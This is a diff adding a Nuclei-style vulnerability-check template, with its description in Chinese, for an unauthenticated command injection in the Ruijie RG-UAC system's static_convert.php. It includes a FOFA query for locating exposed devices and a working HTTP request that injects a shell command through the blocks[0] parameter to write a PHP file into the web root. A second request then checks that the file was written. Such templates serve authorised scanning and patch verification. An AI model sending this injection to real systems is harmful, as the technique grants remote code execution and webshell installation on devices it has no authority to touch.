@@ -1,0 +1,34 @@
+id: ruijie-static_convert-RCE
+
+info:
+  name: 锐捷统一上网行为管理与审计系统 static_convert.php 前台RCE漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title="RG-UAC登录页面"
+    锐捷统一上网行为管理与审计系统 static_convert.php 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139883855
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20print("Superhero");unlink(__FILE__);?>%27%20>/var/www/html/test.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body) >= 9 && len(body) <= 10'
+          - 'status_code == 200'
+          - 'contains(body, "Superhero")'
+        condition: and
+
+
+
+
+
+
